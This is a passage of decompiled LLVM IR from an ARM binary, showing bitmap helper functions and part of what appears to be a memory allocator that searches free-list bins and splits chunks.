dec_label_pc_11bcc:                               ; preds = %.thread16, %dec_label_pc_11bc4
  %v0_11bcc = call i32 @function_11734()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11bd8 = inttoptr i32 %v0_11bcc to i32*
  store i32 22, i32* %v2_11bd8, align 4
  %v0_11c38.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_11be0:                               ; preds = %dec_label_pc_11bc4
  %v2_11be0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11be0, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_11be8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11be8, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11bf8 = call i32 @function_11c74()
  %v0_11c00 = load i32, i32* @r5, align 4
  %v2_11c08 = call i32 @function_11c50(i32 ptrtoint (i32* @global_var_213fc.361 to i32), i32 %v0_11c00)
  store i32 %v2_11ba8, i32* %r2.global-to-local, align 4
  %v0_11c20 = load i32, i32* @r5, align 4
  %v3_11c28 = call i32 @function_14084(i32 %v0_11c20, i32 %v2_11be0, i32 %v2_11ba8)
  %v1_11c2c = icmp slt i32 %v3_11c28, 0
  br i1 %v1_11c2c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_11be0
  %v5_11c30 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11c30, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_11be0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11bcc, %bb32
  %v0_11c38 = phi i32 [ %v5_11c30, %bb31 ], [ %v0_11c38.pre, %dec_label_pc_11bcc ], [ -1, %bb32 ]
  %v2_11c40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11c40, i32* @r4, align 4
  store i32 %v6_11b98, i32* @r5, align 4
  store i32 %v9_11b98, i32* @r6, align 4
  ret i32 %v0_11c38

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @function_11c74, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11bcc, { 1, 0 }
}

define i32 @function_11c50(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c50:
  %v1_11c50 = add i32 %arg2, -1
  %v3_11c54 = udiv i32 %v1_11c50, 32
  %v4_11c58 = mul nuw nsw i32 %v3_11c54, 4
  %v5_11c58 = add i32 %v4_11c58, %arg1
  %v6_11c58 = inttoptr i32 %v5_11c58 to i32*
  %v7_11c58 = load i32, i32* %v6_11c58, align 4
  %v1_11c5c = urem i32 %v1_11c50, 32
  %v7_11c64 = shl i32 1, %v1_11c5c
  %v8_11c64 = and i32 %v7_11c58, %v7_11c64
  %v10_11c64 = icmp ne i32 %v8_11c64, 0
  %. = zext i1 %v10_11c64 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11c50, { 1, 0 }
}

define i32 @function_11c74() local_unnamed_addr {
dec_label_pc_11c74:
  %v0_11c74 = load i32, i32* @r1, align 4
  %v1_11c74 = add i32 %v0_11c74, -1
  %v3_11c78 = udiv i32 %v1_11c74, 32
  %v0_11c7c = load i32, i32* @r0, align 4
  %v4_11c7c = mul nuw nsw i32 %v3_11c78, 4
  %v5_11c7c = add i32 %v0_11c7c, %v4_11c7c
  %v6_11c7c = inttoptr i32 %v5_11c7c to i32*
  %v7_11c7c = load i32, i32* %v6_11c7c, align 4
  %v1_11c80 = urem i32 %v1_11c74, 32
  %v7_11c88 = shl i32 1, %v1_11c80
  %v8_11c88 = or i32 %v7_11c7c, %v7_11c88
  store i32 %v8_11c88, i32* %v6_11c7c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c74, { 1, 0 }
}

define i32 @function_11c98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c98:
  %v1_11c98 = add i32 %arg2, -1
  %v3_11c9c = udiv i32 %v1_11c98, 32
  %v4_11ca0 = mul nuw nsw i32 %v3_11c9c, 4
  %v5_11ca0 = add i32 %v4_11ca0, %arg1
  %v6_11ca0 = inttoptr i32 %v5_11ca0 to i32*
  %v7_11ca0 = load i32, i32* %v6_11ca0, align 4
  %v1_11ca4 = urem i32 %v1_11c98, 32
  %tmp = shl i32 -1, %v1_11ca4
  %v8_11cac = add i32 %tmp, -1
  %v9_11cac = and i32 %v7_11ca0, %v8_11cac
  store i32 %v9_11cac, i32* %v6_11ca0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c98, { 1, 0 }
}

define i32 @function_11cbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_11cbc:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_11cbc = udiv i32 %arg1, 256
  store i32 %v3_11cbc, i32* %r1.global-to-local, align 4
  %v2_11cc0 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11cc0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11cbc
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11cbc, %bb
  %v0_11ccc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11cc0, i32 %v0_11ccc)
  %v0_11cd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11cd0 = add i32 %v0_11cd0, 1048320
  %v3_11cd4 = udiv i32 %v1_11cd0, 65536
  %v1_11cd8 = and i32 %v3_11cd4, 8
  %v6_11cdc = shl i32 %v0_11cd0, %v1_11cd8
  %v1_11ce0 = add i32 %v6_11cdc, 520192
  %v3_11ce4 = udiv i32 %v1_11ce0, 65536
  %v1_11ce8 = and i32 %v3_11ce4, 4
  %v6_11cec = shl i32 %v6_11cdc, %v1_11ce8
  %v1_11cf0 = add i32 %v6_11cec, 245760
  %v3_11cf4 = udiv i32 %v1_11cf0, 65536
  %v1_11cf8 = and i32 %v3_11cf4, 2
  %v6_11cfc = shl i32 %v6_11cec, %v1_11cf8
  store i32 %v6_11cfc, i32* %r1.global-to-local, align 4
  %v1_11d00 = sub nsw i32 13, %v1_11cd8
  %v2_11d04 = sub nsw i32 %v1_11d00, %v1_11ce8
  %v3_11d08 = udiv i32 %v6_11cfc, 32768
  %v4_11d08 = sub nuw nsw i32 -1, %v3_11d08
  %v4_11d0c = udiv i32 %v6_11cfc, 16384
  %v5_11d0c = and i32 %v4_11d0c, %v4_11d08
  %v2_11d10 = sub nsw i32 %v2_11d04, %v1_11cf8
  %v2_11d14 = add nsw i32 %v2_11d10, %v5_11d0c
  %v1_11d18 = add nsw i32 %v2_11d14, 6
  %v0_11d1c = load i32, i32* %ip.global-to-local, align 4
  %v6_11d1c = lshr i32 %v0_11d1c, %v1_11d18
  %v3_11d20 = mul nsw i32 %v2_11d14, 4
  %v1_11d24 = add nsw i32 %v3_11d20, 32
  %v1_11d28 = urem i32 %v6_11d1c, 4
  %v2_11d2c = or i32 %v1_11d28, %v1_11d24
  ret i32 %v2_11d2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_11d34() local_unnamed_addr {
dec_label_pc_11d34:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11d34 = load i32, i32* @r4, align 4
  %v6_11d34 = load i32, i32* @r5, align 4
  %v9_11d34 = load i32, i32* @r6, align 4
  %v12_11d34 = load i32, i32* @r7, align 4
  %v15_11d34 = load i32, i32* @r8, align 4
  %v18_11d34 = load i32, i32* @sb, align 4
  %v21_11d34 = load i32, i32* @sl, align 4
  %v24_11d34 = load i32, i32* @fp, align 4
  %v27_11d34 = load i32, i32* @lr, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_11d48 = load i32, i32* inttoptr (i32 127060 to i32*), align 4
  store i32 %v4_11d48, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_11d54 = load i32, i32* inttoptr (i32 127028 to i32*), align 4
  store i32 %v4_11d54, i32* %r1.global-to-local, align 4
  %v0_11d58 = load i32, i32* @r0, align 4
  store i32 %v0_11d58, i32* @r5, align 4
  store i32 %v4_11d48, i32* %r2.global-to-local, align 4
  %v2_11d60 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11d60, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %ip.global-to-local, align 4
  %v4_11d6c = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  store i32 %v4_11d6c, i32* %ip.global-to-local, align 4
  store i32 73080, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11d6c)
  %v0_11d78 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11d78, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_11d84 = load i32, i32* inttoptr (i32 127008 to i32*), align 32
  store i32 %v4_11d84, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11d90.367 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11d84)
  %v0_11d90 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11d90, -32
  br i1 %tmp, label %dec_label_pc_11dac, label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d34
  %v0_11d98 = call i32 @function_11734()
  store i32 %v0_11d98, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_11da4 = inttoptr i32 %v0_11d98 to i32*
  store i32 12, i32* %v2_11da4, align 4
  br label %dec_label_pc_12628

dec_label_pc_11dac:                               ; preds = %dec_label_pc_11d34
  %v1_11dac = add i32 %v0_11d90, 11
  store i32 %v1_11dac, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r2.global-to-local, align 4
  %v2_11db8 = icmp ugt i32 %v1_11dac, 14
  %v7_11db8 = icmp eq i32 %v1_11dac, 15
  %v2_11dbc = xor i1 %v7_11db8, true
  %v3_11dbc = and i1 %v2_11db8, %v2_11dbc
  br i1 %v3_11dbc, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_11dac
  %v5_11dbc = and i32 %v1_11dac, -8
  store i32 %v5_11dbc, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_11dac, %bb
  %v4_11dc0 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_11dc0, i32* @r0, align 4
  %v1_11dc4 = inttoptr i32 %v4_11dc0 to i32*
  %v2_11dc4 = load i32, i32* %v1_11dc4, align 4
  store i32 %v2_11dc4, i32* @r4, align 4
  %v2_11dc8 = xor i1 %v2_11db8, true
  %v3_11dc8 = or i1 %v7_11db8, %v2_11dc8
  br i1 %v3_11dc8, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_11dcc = urem i32 %v2_11dc4, 2
  %v2_11dcc = icmp eq i32 %v1_11dcc, 0
  br i1 %v2_11dcc, label %dec_label_pc_11dd4, label %dec_label_pc_11de4

dec_label_pc_11dd4:                               ; preds = %bb140
  %v2_11dd4 = icmp eq i32 %v2_11dc4, 0
  br i1 %v2_11dd4, label %dec_label_pc_11ddc, label %dec_label_pc_121c0

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11dd4
  %v0_11ddc = call i32 @function_12bec()
  store i32 %v0_11ddc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_121c0

dec_label_pc_11de4:                               ; preds = %bb140
  %v0_11de4 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_11de4, %v2_11dc4
  br i1 %tmp201, label %dec_label_pc_11e0c, label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11de4
  %v1_11dec = add i32 %v4_11dc0, -4
  store i32 %v1_11dec, i32* %r1.global-to-local, align 4
  %v3_11df0 = udiv i32 %v0_11de4, 8
  store i32 %v3_11df0, i32* %r2.global-to-local, align 4
  %v4_11df4 = mul nuw i32 %v3_11df0, 4
  %v5_11df4 = add i32 %v4_11df4, %v1_11dec
  %v6_11df4 = inttoptr i32 %v5_11df4 to i32*
  %v7_11df4 = load i32, i32* %v6_11df4, align 4
  store i32 %v7_11df4, i32* %r0.global-to-local, align 4
  %v2_11df8 = icmp eq i32 %v7_11df4, 0
  br i1 %v2_11df8, label %dec_label_pc_11e0c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11dec
  %v2_11dfc = add i32 %v7_11df4, 8
  %v3_11dfc = inttoptr i32 %v2_11dfc to i32*
  %v4_11dfc = load i32, i32* %v3_11dfc, align 4
  store i32 %v4_11dfc, i32* %r3.global-to-local, align 4
  store i32 %v2_11dfc, i32* %r0.global-to-local, align 4
  store i32 %v2_11dfc, i32* %r4.global-to-local, align 4
  store i32 %v4_11dfc, i32* %v6_11df4, align 4
  br label %dec_label_pc_1260c

dec_label_pc_11e0c:                               ; preds = %dec_label_pc_11dec, %dec_label_pc_11de4
  %tmp202 = icmp ugt i32 %v0_11de4, 255
  br i1 %tmp202, label %dec_label_pc_11e5c, label %dec_label_pc_11e14

dec_label_pc_11e14:                               ; preds = %dec_label_pc_11e0c
  store i32 126992, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11e1c = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  %v3_11e20 = udiv i32 %v0_11de4, 8
  store i32 %v3_11e20, i32* @r7, align 4
  %v4_11e24 = mul nuw i32 %v3_11e20, 8
  %v5_11e24 = add i32 %v4_11e1c, %v4_11e24
  store i32 %v5_11e24, i32* %r3.global-to-local, align 4
  %v1_11e28 = add i32 %v5_11e24, 44
  store i32 %v1_11e28, i32* %ip.global-to-local, align 4
  %v1_11e2c = add i32 %v5_11e24, 56
  %v2_11e2c = inttoptr i32 %v1_11e2c to i32*
  %v3_11e2c = load i32, i32* %v2_11e2c, align 4
  store i32 %v3_11e2c, i32* %r0.global-to-local, align 4
  %v9_11e30 = icmp eq i32 %v3_11e2c, %v1_11e28
  br i1 %v9_11e30, label %dec_label_pc_11fbc, label %dec_label_pc_11e38

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e14
  %v2_11e38 = add i32 %v3_11e2c, %v0_11de4
  store i32 %v2_11e38, i32* %r3.global-to-local, align 4
  %v1_11e3c = add i32 %v2_11e38, 4
  %v2_11e3c = inttoptr i32 %v1_11e3c to i32*
  %v3_11e3c = load i32, i32* %v2_11e3c, align 4
  store i32 %v3_11e3c, i32* %r2.global-to-local, align 4
  %v1_11e40 = add i32 %v3_11e2c, 12
  %v2_11e40 = inttoptr i32 %v1_11e40 to i32*
  %v3_11e40 = load i32, i32* %v2_11e40, align 4
  store i32 %v3_11e40, i32* %r1.global-to-local, align 4
  %v1_11e44 = or i32 %v3_11e3c, 1
  store i32 %v1_11e44, i32* %r2.global-to-local, align 4
  %v1_11e48 = add i32 %v3_11e2c, 8
  store i32 %v1_11e48, i32* %r4.global-to-local, align 4
  store i32 %v1_11e44, i32* %v2_11e3c, align 4
  %v0_11e50 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e50 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e50 = add i32 %v1_11e50, 8
  %v3_11e50 = inttoptr i32 %v2_11e50 to i32*
  store i32 %v0_11e50, i32* %v3_11e50, align 4
  %v0_11e54 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e54 = load i32, i32* %ip.global-to-local, align 4
  %v2_11e54 = add i32 %v1_11e54, 12
  %v3_11e54 = inttoptr i32 %v2_11e54 to i32*
  store i32 %v0_11e54, i32* %v3_11e54, align 4
  br label %dec_label_pc_1260c

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e0c
  store i32 %v0_11de4, i32* %r0.global-to-local, align 4
  %v1_11e60 = call i32 @function_11cbc(i32 %v0_11de4)
  store i32 %v1_11e60, i32* %r0.global-to-local, align 4
  %v0_11e64 = load i32, i32* @r4, align 4
  %v1_11e64 = and i32 %v0_11e64, 2
  %v2_11e64 = icmp eq i32 %v1_11e64, 0
  store i32 %v1_11e60, i32* @r7, align 4
  br i1 %v2_11e64, label %dec_label_pc_11fbc, label %dec_label_pc_11e70

dec_label_pc_11e70:                               ; preds = %dec_label_pc_11e5c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_11e78 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_11e78, i32* @r0, align 4
  %v0_11e7c = call i32 @function_12bec()
  store i32 %v0_11e7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11fbc

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11fd0
  %v1_11e84 = add i32 %v3_11fd0, 4
  %v2_11e84 = inttoptr i32 %v1_11e84 to i32*
  %v3_11e84 = load i32, i32* %v2_11e84, align 4
  store i32 %v3_11e84, i32* %r3.global-to-local, align 4
  %v0_11e88 = load i32, i32* @sl, align 4
  %v1_11e8c = and i32 %v3_11e84, -4
  store i32 %v1_11e8c, i32* %r4.global-to-local, align 4
  %v1_11e90 = add i32 %v3_11fd0, 12
  %v2_11e90 = inttoptr i32 %v1_11e90 to i32*
  %v3_11e90 = load i32, i32* %v2_11e90, align 4
  store i32 %v3_11e90, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_11e88, 255
  br i1 %tmp203, label %dec_label_pc_11eec, label %dec_label_pc_11e98

dec_label_pc_11e98:                               ; preds = %dec_label_pc_11e84
  %v9_11e98 = icmp eq i32 %v3_11e90, %v0_11ef0
  br i1 %v9_11e98, label %dec_label_pc_11ea0, label %dec_label_pc_11eec

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e98
  %v0_11ea0 = load i32, i32* @sb, align 4
  %v1_11ea0 = add i32 %v0_11ea0, 48
  %v2_11ea0 = inttoptr i32 %v1_11ea0 to i32*
  %v3_11ea0 = load i32, i32* %v2_11ea0, align 4
  store i32 %v3_11ea0, i32* %r3.global-to-local, align 4
  %v9_11ea4 = icmp eq i32 %v3_11fd0, %v3_11ea0
  br i1 %v9_11ea4, label %dec_label_pc_11eac, label %dec_label_pc_11eec

dec_label_pc_11eac:                               ; preds = %dec_label_pc_11ea0
  %v1_11eac = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_11e8c, %v1_11eac
  br i1 %tmp204, label %dec_label_pc_11eb4, label %dec_label_pc_11eec

dec_label_pc_11eb4:                               ; preds = %dec_label_pc_11eac
  %v2_11eb4 = sub i32 %v1_11e8c, %v0_11e88
  store i32 %v2_11eb4, i32* %r2.global-to-local, align 4
  %v2_11eb8 = add i32 %v0_11e88, %v3_11fd0
  store i32 %v2_11eb8, i32* %r3.global-to-local, align 4
  %v1_11ebc = or i32 %v0_11e88, 1
  store i32 %v1_11ebc, i32* %r0.global-to-local, align 4
  %v1_11ec0 = or i32 %v2_11eb4, 1
  store i32 %v1_11ec0, i32* %r1.global-to-local, align 4
  %v1_11ec4 = add i32 %v3_11fd0, 8
  store i32 %v1_11ec4, i32* %r4.global-to-local, align 4
  %v2_11ec8 = add i32 %v0_11ef0, 8
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i32*
  store i32 %v2_11eb8, i32* %v3_11ec8, align 4
  %v0_11ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_11ecc = load i32, i32* %ip.global-to-local, align 4
  %v2_11ecc = add i32 %v1_11ecc, 12
  %v3_11ecc = inttoptr i32 %v2_11ecc to i32*
  store i32 %v0_11ecc, i32* %v3_11ecc, align 4
  %v0_11ed0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ed0 = load i32, i32* @r6, align 4
  %v2_11ed0 = add i32 %v1_11ed0, 4
  %v3_11ed0 = inttoptr i32 %v2_11ed0 to i32*
  store i32 %v0_11ed0, i32* %v3_11ed0, align 4
  %v0_11ed4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ed4 = load i32, i32* @sb, align 4
  %v2_11ed4 = add i32 %v1_11ed4, 48
  %v3_11ed4 = inttoptr i32 %v2_11ed4 to i32*
  store i32 %v0_11ed4, i32* %v3_11ed4, align 4
  %v0_11ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ed8 = load i32, i32* %r3.global-to-local, align 4
  %v3_11ed8 = add i32 %v1_11ed8, %v0_11ed8
  %v4_11ed8 = inttoptr i32 %v3_11ed8 to i32*
  store i32 %v0_11ed8, i32* %v4_11ed8, align 4
  %v0_11edc = load i32, i32* %r1.global-to-local, align 4
  %v1_11edc = load i32, i32* %r3.global-to-local, align 4
  %v2_11edc = add i32 %v1_11edc, 4
  %v3_11edc = inttoptr i32 %v2_11edc to i32*
  store i32 %v0_11edc, i32* %v3_11edc, align 4
  %v0_11ee0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ee0 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ee0 = add i32 %v1_11ee0, 12
  %v3_11ee0 = inttoptr i32 %v2_11ee0 to i32*
  store i32 %v0_11ee0, i32* %v3_11ee0, align 4
  %v0_11ee4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ee4 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ee4 = add i32 %v1_11ee4, 8
  %v3_11ee4 = inttoptr i32 %v2_11ee4 to i32*
  store i32 %v0_11ee4, i32* %v3_11ee4, align 4
  br label %dec_label_pc_1260c

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11eac, %dec_label_pc_11ea0, %dec_label_pc_11e98, %dec_label_pc_11e84
  %v9_11eec = icmp eq i32 %v1_11e8c, %v0_11e88
  %v2_11ef0 = add i32 %v3_11e90, 8
  %v3_11ef0 = inttoptr i32 %v2_11ef0 to i32*
  store i32 %v0_11ef0, i32* %v3_11ef0, align 4
  %v0_11ef4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ef4 = load i32, i32* %r5.global-to-local, align 4
  %v2_11ef4 = add i32 %v1_11ef4, 12
  %v3_11ef4 = inttoptr i32 %v2_11ef4 to i32*
  store i32 %v0_11ef4, i32* %v3_11ef4, align 4
  br i1 %v9_11eec, label %dec_label_pc_1204c.loopexit, label %dec_label_pc_11f08

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11eec
  %v0_11f08 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_11f08, 255
  br i1 %tmp205, label %dec_label_pc_11f2c, label %dec_label_pc_11f10

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11f08
  store i32 126992, i32* %r2.global-to-local, align 4
  %v1_11f14 = load i32, i32* %r8.global-to-local, align 4
  %v2_11f14 = add i32 %v1_11f14, 126992
  %v3_11f14 = inttoptr i32 %v2_11f14 to i32*
  %v4_11f14 = load i32, i32* %v3_11f14, align 4
  %v3_11f18 = udiv i32 %v0_11f08, 8
  store i32 %v3_11f18, i32* %r0.global-to-local, align 4
  %v4_11f1c = mul nuw i32 %v3_11f18, 8
  %v5_11f1c = add i32 %v4_11f14, %v4_11f1c
  store i32 %v5_11f1c, i32* %r3.global-to-local, align 4
  %v1_11f20 = add i32 %v5_11f1c, 44
  store i32 %v1_11f20, i32* %ip.global-to-local, align 4
  %v1_11f24 = add i32 %v5_11f1c, 52
  %v2_11f24 = inttoptr i32 %v1_11f24 to i32*
  %v3_11f24 = load i32, i32* %v2_11f24, align 4
  store i32 %v3_11f24, i32* @lr, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f08
  store i32 %v0_11f08, i32* %r0.global-to-local, align 4
  %v1_11f30 = call i32 @function_11cbc(i32 %v0_11f08)
  store i32 %v1_11f30, i32* %r0.global-to-local, align 4
  store i32 126992, i32* %ip.global-to-local, align 4
  %v1_11f38 = load i32, i32* %r8.global-to-local, align 4
  %v2_11f38 = add i32 %v1_11f38, 126992
  %v3_11f38 = inttoptr i32 %v2_11f38 to i32*
  %v4_11f38 = load i32, i32* %v3_11f38, align 4
  %v4_11f3c = mul i32 %v1_11f30, 8
  %v5_11f3c = add i32 %v4_11f38, %v4_11f3c
  store i32 %v5_11f3c, i32* %r3.global-to-local, align 4
  %v1_11f40 = add i32 %v5_11f3c, 44
  store i32 %v1_11f40, i32* %ip.global-to-local, align 4
  %v1_11f44 = add i32 %v5_11f3c, 52
  %v2_11f44 = inttoptr i32 %v1_11f44 to i32*
  %v3_11f44 = load i32, i32* %v2_11f44, align 4
  store i32 %v3_11f44, i32* @lr, align 4
  %v9_11f48 = icmp eq i32 %v3_11f44, %v1_11f40
  br i1 %v9_11f48, label %dec_label_pc_11f84, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f2c
  %v1_11f50 = add i32 %v5_11f3c, 56
  %v2_11f50 = inttoptr i32 %v1_11f50 to i32*
  %v3_11f50 = load i32, i32* %v2_11f50, align 4
  store i32 %v3_11f50, i32* %r1.global-to-local, align 4
  %v1_11f54 = add i32 %v3_11f50, 4
  %v2_11f54 = inttoptr i32 %v1_11f54 to i32*
  %v3_11f54 = load i32, i32* %v2_11f54, align 4
  store i32 %v3_11f54, i32* %r3.global-to-local, align 4
  %v0_11f58 = load i32, i32* %r4.global-to-local, align 4
  %v3_11f58 = icmp ult i32 %v0_11f58, %v3_11f54
  br i1 %v3_11f58, label %.thread, label %dec_label_pc_11f74.preheader

.thread:                                          ; preds = %dec_label_pc_11f50
  store i32 %v1_11f40, i32* @lr, align 4
  store i32 %v3_11f50, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f74.preheader:                     ; preds = %dec_label_pc_11f50
  %v2_11f60 = or i32 %v0_11f58, 1
  store i32 %v2_11f60, i32* %r2.global-to-local, align 4
  %v1_11f74179 = add i32 %v3_11f44, 4
  %v2_11f74180 = inttoptr i32 %v1_11f74179 to i32*
  %v3_11f74181 = load i32, i32* %v2_11f74180, align 4
  store i32 %v3_11f74181, i32* %r3.global-to-local, align 4
  %v3_11f78183 = icmp ult i32 %v2_11f60, %v3_11f74181
  br i1 %v3_11f78183, label %dec_label_pc_11f70, label %dec_label_pc_11f80

dec_label_pc_11f70:                               ; preds = %dec_label_pc_11f74.preheader, %dec_label_pc_11f70
  %v0_11f80184 = phi i32 [ %v3_11f70, %dec_label_pc_11f70 ], [ %v3_11f44, %dec_label_pc_11f74.preheader ]
  %v1_11f70 = add i32 %v0_11f80184, 8
  %v2_11f70 = inttoptr i32 %v1_11f70 to i32*
  %v3_11f70 = load i32, i32* %v2_11f70, align 4
  store i32 %v3_11f70, i32* @lr, align 4
  %v1_11f74 = add i32 %v3_11f70, 4
  %v2_11f74 = inttoptr i32 %v1_11f74 to i32*
  %v3_11f74 = load i32, i32* %v2_11f74, align 4
  store i32 %v3_11f74, i32* %r3.global-to-local, align 4
  %v3_11f78 = icmp ult i32 %v2_11f60, %v3_11f74
  br i1 %v3_11f78, label %dec_label_pc_11f70, label %dec_label_pc_11f80

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11f70, %dec_label_pc_11f74.preheader
  %v0_11f80.lcssa = phi i32 [ %v3_11f44, %dec_label_pc_11f74.preheader ], [ %v3_11f70, %dec_label_pc_11f70 ]
  %v1_11f80 = add i32 %v0_11f80.lcssa, 12
  %v2_11f80 = inttoptr i32 %v1_11f80 to i32*
  %v3_11f80 = load i32, i32* %v2_11f80, align 4
  store i32 %v3_11f80, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f84:                               ; preds = %.thread, %dec_label_pc_11f2c, %dec_label_pc_11f10, %dec_label_pc_11f80
  %v0_11fa4 = phi i32 [ %v1_11f40, %dec_label_pc_11f2c ], [ %v1_11f20, %dec_label_pc_11f10 ], [ %v3_11f80, %dec_label_pc_11f80 ], [ %v3_11f50, %.thread ]
  %v0_11f98 = phi i32 [ %v1_11f30, %dec_label_pc_11f2c ], [ %v3_11f18, %dec_label_pc_11f10 ], [ %v1_11f30, %dec_label_pc_11f80 ], [ %v1_11f30, %.thread ]
  %v1_11f88 = phi i32 [ %v1_11f38, %dec_label_pc_11f2c ], [ %v1_11f14, %dec_label_pc_11f10 ], [ %v1_11f38, %dec_label_pc_11f80 ], [ %v1_11f38, %.thread ]
  store i32 126992, i32* %r2.global-to-local, align 4
  %v2_11f88 = add i32 %v1_11f88, 126992
  %v3_11f88 = inttoptr i32 %v2_11f88 to i32*
  %v4_11f88 = load i32, i32* %v3_11f88, align 4
  %v3_11f8c = sdiv i32 %v0_11f98, 32
  store i32 %v3_11f8c, i32* %r3.global-to-local, align 4
  %v4_11f90 = mul nsw i32 %v3_11f8c, 4
